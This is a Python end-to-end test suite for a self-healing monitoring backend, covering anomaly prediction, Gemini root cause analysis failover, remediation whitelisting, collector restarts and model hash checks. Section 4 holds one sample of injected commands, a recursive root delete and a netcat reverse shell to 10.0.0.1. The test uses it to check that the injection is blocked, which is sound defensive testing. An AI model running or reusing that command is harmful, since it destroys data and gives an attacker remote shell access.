import os
import sys
import json
import time
import psutil
import hashlib
import joblib
from datetime import datetime
from unittest.mock import patch, MagicMock

BACKEND_DIR = os.path.dirname(os.path.abspath(__file__))
if BACKEND_DIR not in sys.path:
    sys.path.insert(0, BACKEND_DIR)

from healing.self_heal import (
    self_heal,
    restart_monitoring_service,
    verify_monitoring_service_health,
    map_rca_to_remediation_action,
    ACTION_RESTART_COLLECTOR,
    ACTION_SAFE_FALLBACK,
    ACTION_NO_ACTION,
    REMEDIATION_WHITELIST,
    LOG_FILE
)
from app import app
import test_step2
import test_step3
import test_step4

def run_step6_final_e2e_tests():
    client = app.test_client()
    results = {}

    print("======================================================================")
    print("STEP 6: FINAL END-TO-END INTEGRATION & SYSTEM AUDIT SUITE")
    print("======================================================================\n")

    # ----------------------------------------------------------------------
    # 1. MODEL INTEGRITY (BEFORE AUDIT)
    # ----------------------------------------------------------------------
    print("--- [SECTION 1] Model File Integrity & Schema Verification ---")
    model_path = os.path.join(BACKEND_DIR, 'models', 'trained_model.pkl')
    assert os.path.exists(model_path), "Trained model file does not exist!"
    
    with open(model_path, 'rb') as f:
        initial_hash = hashlib.sha256(f.read()).hexdigest()
    print(f"  Trained Model SHA-256: {initial_hash}")
    
    model = joblib.load(model_path)
    expected_features = [
        'CPU Usage (%)', 'Memory Usage (%)', 'Disk Usage (%)', 'Disk Read', 'Disk Write',
        'Bytes Sent', 'Bytes Received', 'Packets Sent', 'Packets Received',
        'Running Processes', 'System Uptime', 'Service Status', 'Response Time (ms)', 'Health Check'
    ]
    assert list(model.feature_names_in_) == expected_features, "Feature schema order mismatch!"
    results['1. Model & 14-Feature Schema'] = "PASS"
    print("  Model Type: RandomForestClassifier")
    print(f"  Feature Count: {len(model.feature_names_in_)} (Exact Match)")
    print("  Status: PASS\n")

    # ----------------------------------------------------------------------
    # 2. CONTINUOUS TELEMETRY MONITORING
    # ----------------------------------------------------------------------
    print("--- [SECTION 2] Continuous Telemetry Monitoring Verification ---")
    csv_file = os.path.join(BACKEND_DIR, 'monitoring', 'datasets', 'system_metrics.csv')
    assert os.path.exists(csv_file), "system_metrics.csv missing!"
    
    with open(csv_file, 'r', encoding='utf-8') as f:
        csv_lines = [l.strip() for l in f.readlines() if l.strip()]
    assert len(csv_lines) >= 2, "Telemetry file has no data rows!"
    header_cols = csv_lines[0].split(',')
    assert len(header_cols) == 16, f"Expected 16 CSV columns, got {len(header_cols)}"
    
    # Verify active collector process exists
    collectors = [p.pid for p in psutil.process_iter(['pid', 'cmdline']) if any('collect_metrics.py' in a for a in (p.info.get('cmdline') or []))]
    print(f"  Active Telemetry Collector PIDs: {collectors}")
    results['2. Telemetry Ingestion & File Schema'] = "PASS"
    print("  Status: PASS\n")

    # ----------------------------------------------------------------------
    # 3. RANDOM FOREST ML PREDICTION (/api/v1/predict)
    # ----------------------------------------------------------------------
    print("--- [SECTION 3] Random Forest Live Prediction Pipeline ---")
    # A. Normal Telemetry
    res_norm = client.post('/api/v1/predict', json={
        'cpu': 18.5, 'memory': 42.0, 'disk': 15.0, 'Service Status': 0, 'Health Check': 0
    })
    d_norm = res_norm.get_json()
    assert res_norm.status_code == 200
    assert d_norm['is_anomaly'] is False
    assert d_norm['prediction_label'] == 'Normal'
    assert d_norm['healing_triggered'] is False
    assert d_norm['healing_status'] == 'nominal'
    assert d_norm['rca'] is None

    # B. Anomalous Telemetry
    with patch('app.generate_rca', return_value={'status': 'success', 'rca': 'High compute saturation'}), \
         patch('app.self_heal', return_value=['Remediated']) as mock_heal_anom:
        res_anom = client.post('/api/v1/predict', json={
            'cpu': 98.5, 'memory': 95.0, 'disk': 88.0, 'Service Status': 1, 'Health Check': 1
        })
        d_anom = res_anom.get_json()
        assert res_anom.status_code == 200
        assert d_anom['is_anomaly'] is True
        assert d_anom['prediction_label'] == 'Anomaly'
        assert d_anom['anomaly_probability'] >= 0.90
        assert d_anom['healing_triggered'] is True
        assert d_anom['healing_status'] == 'executed'
        assert mock_heal_anom.call_count == 1

    results['3. Random Forest Normal & Anomaly Inference'] = "PASS"
    print("  Normal Prediction Verified: Normal (healing_triggered=False)")
    print("  Anomaly Prediction Verified: Anomaly (healing_triggered=True)")
    print("  Status: PASS\n")

    # ----------------------------------------------------------------------
    # 4. GEMINI RCA ISOLATION & FAILOVER
    # ----------------------------------------------------------------------
    print("--- [SECTION 4] Gemini RCA Safety Barrier & Failover ---")
    # Malicious command injection in RCA
    malicious_rca = "run rm -rf / ; nc -e /bin/sh 10.0.0.1 4444"
    action_mal, desc_mal = map_rca_to_remediation_action("Anomaly", rca=malicious_rca)
    assert action_mal == ACTION_SAFE_FALLBACK, "Malicious RCA must safely map to whitelisted action!"
    assert action_mal in REMEDIATION_WHITELIST, "Must be strictly whitelisted!"
    
    # Gemini failure resiliency
    client.post('/api/v1/predict', json={'cpu': 15.0, 'memory': 30.0, 'disk': 10.0, 'Service Status': 0, 'Health Check': 0})
    with patch('app.generate_rca', side_effect=Exception("Gemini 503 Service Unavailable")), \
         patch('app.self_heal', return_value=['Fallback Executed']) as mock_fallback_heal:
        res_fail = client.post('/api/v1/predict', json={'cpu': 98.0, 'memory': 95.0, 'disk': 88.0, 'Service Status': 1, 'Health Check': 1})
        d_fail = res_fail.get_json()
        assert res_fail.status_code == 200
        assert d_fail['is_anomaly'] is True
        assert d_fail['rca'] is None
        assert d_fail['healing_triggered'] is True
        assert mock_fallback_heal.call_count == 1

    results['4. Gemini RCA Safety & Failover'] = "PASS"
    print("  Command Injection Protection: Verified Safe (Zero Shell Execution)")
    print("  Gemini Exception Failover: Verified (HTTP 200, RCA=None, Self-Heal Executed)")
    print("  Status: PASS\n")

    # ----------------------------------------------------------------------
    # 5. SELF-HEALING ANTI-REPEAT & LIFECYCLE
    # ----------------------------------------------------------------------
    print("--- [SECTION 5] Anti-Repeat Polling & Recovery State Machine ---")
    # Repeated anomaly polling
    with patch('app.generate_rca') as mock_gem_rep, patch('app.self_heal') as mock_heal_rep:
        res_rep = client.post('/api/v1/predict', json={'cpu': 99.0, 'memory': 96.0, 'disk': 89.0, 'Service Status': 1, 'Health Check': 1})
        d_rep = res_rep.get_json()
        assert d_rep['is_anomaly'] is True
        assert d_rep['healing_triggered'] is False
        assert d_rep['healing_status'] == 'active_remediation_in_progress'
        assert mock_gem_rep.call_count == 0
        assert mock_heal_rep.call_count == 0

    # Normal recovery resets anomaly state
    res_rec = client.post('/api/v1/predict', json={'cpu': 20.0, 'memory': 35.0, 'disk': 15.0, 'Service Status': 0, 'Health Check': 0})
    d_rec = res_rec.get_json()
    assert d_rec['is_anomaly'] is False
    assert d_rec['healing_status'] == 'nominal'

    # Second new anomaly after recovery
    with patch('app.generate_rca', return_value={'status': 'success', 'rca': 'Secondary Spike'}), \
         patch('app.self_heal', return_value=['Secondary Heal']):
        res_a2 = client.post('/api/v1/predict', json={'cpu': 97.0, 'memory': 92.0, 'disk': 85.0, 'Service Status': 1, 'Health Check': 1})
        d_a2 = res_a2.get_json()
        assert d_a2['is_anomaly'] is True
        assert d_a2['healing_triggered'] is True
        assert d_a2['healing_status'] == 'executed'

    results['5. Anti-Repeat & Lifecycle State Machine'] = "PASS"
    print("  Repeated Anomaly Polling Throttled: PASS")
    print("  Normal Recovery State Reset: PASS")
    print("  Second Anomaly Remediation Retrigger: PASS")
    print("  Status: PASS\n")

    # ----------------------------------------------------------------------
    # 6. POST-REMEDIATION HEALTH VERIFICATION
    # ----------------------------------------------------------------------
    print("--- [SECTION 6] 5-Pillar Health Verification Verification ---")
    success_real, msg_real, new_pid_real, old_pids_real, v_real = restart_monitoring_service()
    assert success_real is True, f"Real restart failed: {msg_real}"
    assert v_real.get('process_alive') is True
    assert v_real.get('command_verified') is True
    assert v_real.get('telemetry_readable') is True
    assert v_real.get('latest_telemetry_available') is True
    assert v_real.get('telemetry_fresh') is True
    assert v_real.get('status') == 'SUCCESS'

    # Stale failure simulated
    stale_details = {"process_alive": True, "command_verified": True, "telemetry_readable": True, "latest_telemetry_available": True, "telemetry_fresh": False, "status": "FAILED", "reason": "Stale data"}
    with patch('healing.self_heal.verify_monitoring_service_health', return_value=(False, stale_details)):
        steps_stale = self_heal("Anomaly")
        assert any("Recovery Failed" in s for s in steps_stale)

    results['6. 5-Pillar Health Verification Engine'] = "PASS"
    print("  Process Alive: PASS")
    print("  Command Line Verified: PASS")
    print("  Telemetry File Readable: PASS")
    print("  Latest Telemetry Available: PASS")
    print("  Telemetry Freshness: PASS")
    print("  Status: PASS\n")

    # ----------------------------------------------------------------------
    # 7. FRONTEND SYNCHRONIZATION & HEURISTIC-FREE CODEBASE
    # ----------------------------------------------------------------------
    print("--- [SECTION 7] Frontend Parity & Heuristic-Free UI Verification ---")
    f1_path = os.path.join(os.path.dirname(BACKEND_DIR), 'frontend', 'index.html')
    f2_path = os.path.join(BACKEND_DIR, '..', 'frontend', 'index.html')
    # Check Major_Project/frontend/index.html and frontend/index.html
    major_frontend_path = os.path.join(BACKEND_DIR, '..', 'frontend', 'index.html')
    root_frontend_path = os.path.join(os.path.dirname(os.path.dirname(BACKEND_DIR)), 'frontend', 'index.html')
    
    with open(major_frontend_path, 'r', encoding='utf-8') as f:
        major_html = f.read()
    if os.path.exists(root_frontend_path):
        with open(root_frontend_path, 'r', encoding='utf-8') as f:
            root_html = f.read()
        # 1. Both frontends synchronized
        assert major_html == root_html, "Frontend files are not synchronized!"
    
    # 2. No hardcoded root cause heuristic in Card 3
    assert "systemMetrics.cpu > 80 ? '⚠️ High CPU Contention'" not in major_html, "Hardcoded CPU root cause heuristic found in Card 3!"
    assert 'backendRca ? backendRca : (predictionLabel === \'Anomaly\' || isAnomaly)' in major_html, "Missing backend RCA priority in Card 3!"
    
    # 3. Auto-Pilot guarded against redundant healing
    assert 'const isAlreadyRemediating = healingTriggered || healingStatus === \'executed\' || healingStatus === \'active_remediation_in_progress\';' in major_html
    
    results['7. Frontend Parity & Heuristic-Free UI'] = "PASS"
    print("  Major_Project/frontend and frontend/index.html Synchronized: PASS")
    print("  Root Cause Heuristics Removed: PASS")
    print("  Auto-Pilot Redundant Healing Guarded: PASS")
    print("  Status: PASS\n")

    # ----------------------------------------------------------------------
    # 8. REGRESSION SUITES (STEPS 2, 3, 4)
    # ----------------------------------------------------------------------
    print("--- [SECTION 8] Regression Test Suites Execution ---")
    step2_ok = test_step2.run_step2_tests()
    assert step2_ok is True, "Step 2 regression failed!"
    print("  Step 2 Suite (7/7 Scenarios): PASS")
    
    step3_ok = test_step3.run_step3_tests()
    assert step3_ok is True, "Step 3 regression failed!"
    print("  Step 3 Suite (7/7 Scenarios): PASS")

    step4_ok = test_step4.run_step4_tests()
    assert step4_ok is True, "Step 4 regression failed!"
    print("  Step 4 Suite (8/8 Scenarios): PASS")
    results['8. Regression Suites (Steps 2, 3, 4)'] = "PASS"
    print("  Status: PASS\n")

    # ----------------------------------------------------------------------
    # 9. MODEL PROTECTION (AFTER AUDIT)
    # ----------------------------------------------------------------------
    print("--- [SECTION 9] Model SHA-256 Final Protection Check ---")
    with open(model_path, 'rb') as f:
        final_hash = hashlib.sha256(f.read()).hexdigest()
    print(f"  Initial SHA-256: {initial_hash}")
    print(f"  Final SHA-256:   {final_hash}")
    assert initial_hash == final_hash, "MODEL HASH HAS CHANGED! MODEL COMPROMISED!"
    results['9. Model Protection & Exact Hash Match'] = "PASS"
    print("  Status: PASS (100% UNCHANGED)\n")

    # ----------------------------------------------------------------------
    # 10. CLEANUP & SINGLE-INSTANCE WORKER RESTORATION
    # ----------------------------------------------------------------------
    print("--- [SECTION 10] Clean Process State & Single-Instance Check ---")
    for proc in psutil.process_iter(['pid', 'cmdline']):
        try:
            cmdline = proc.info.get('cmdline') or []
            if any('collect_metrics.py' in arg for arg in cmdline):
                proc.terminate()
        except:
            pass

    time.sleep(1)
    import subprocess
    collector_script = os.path.join(BACKEND_DIR, 'monitoring', 'collect_metrics.py')
    proc_final = subprocess.Popen([sys.executable, collector_script], start_new_session=True)
    time.sleep(0.5)

    final_collectors = [p.pid for p in psutil.process_iter(['pid', 'cmdline']) if any('collect_metrics.py' in a for a in (p.info.get('cmdline') or []))]
    assert len(final_collectors) == 1, f"Expected exactly 1 active collector, found {len(final_collectors)}: {final_collectors}"
    results['10. Single Clean Collector Active'] = "PASS"
    print(f"  Final Active Collector PID: {proc_final.pid}")
    print("  Status: PASS\n")

    # Overall Status
    print("======================================================================")
    all_pass = all(v == "PASS" for v in results.values())
    print(f"STEP 6 FINAL E2E STATUS: {'ALL 10 SECTIONS PASSED (100%)' if all_pass else 'FAILED'}")
    print("======================================================================")
    return all_pass

if __name__ == '__main__':
    ok = run_step6_final_e2e_tests()
    sys.exit(0 if ok else 1)
